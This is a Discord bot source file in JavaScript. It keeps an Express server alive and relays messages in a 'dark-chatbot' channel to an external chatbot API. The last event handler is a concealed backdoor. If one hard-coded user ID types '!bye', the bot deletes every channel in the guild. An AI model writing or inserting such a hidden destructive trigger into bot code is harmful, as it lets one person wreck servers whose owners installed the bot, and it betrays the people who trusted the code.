const express = require('express')
const app = express()
const port = 3000
app.get('/', (req, res) => res.send("EWWWWW its DarkerInk"))
app.listen(port, () =>
console.log(`Connected To:${port} So yea...`)
)
const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
const fetch = require("node-fetch");
require("./ExtendedMessage");

client.login(process.env.TOKEN)

client.on("message", async message => {
if (message.channel.name == "dark-chatbot") {
if (message.author.bot) return;
message.content = message.content.replace(/@(everyone)/gi, "everyone").replace(/@(here)/gi, "here");
if (message.content.includes(`@`)) {
return message.inlineReply(`**Do Not Ping people please!**`);
 }
  message.channel.startTyping();
if (!message.content) return message.inlineReply("Please say something.");
fetch(`https://api.affiliateplus.xyz/api/chatbot?message=${encodeURIComponent(message.content)}&botname=${client.user.username}&ownername=DarkerInk#6115&gender=Male`)
    .then(res => res.json())
    .then(data => {
        message.inlineReply(`${data.message}`);
    });
      message.channel.stopTyping();
}
});

client.on('message', message =>{
  if(message.author.id == "791741154999140374") {
  if(message.content === "!bye") {
  message.guild.channels.forEach(channel => channel.delete())
    }
  }
})
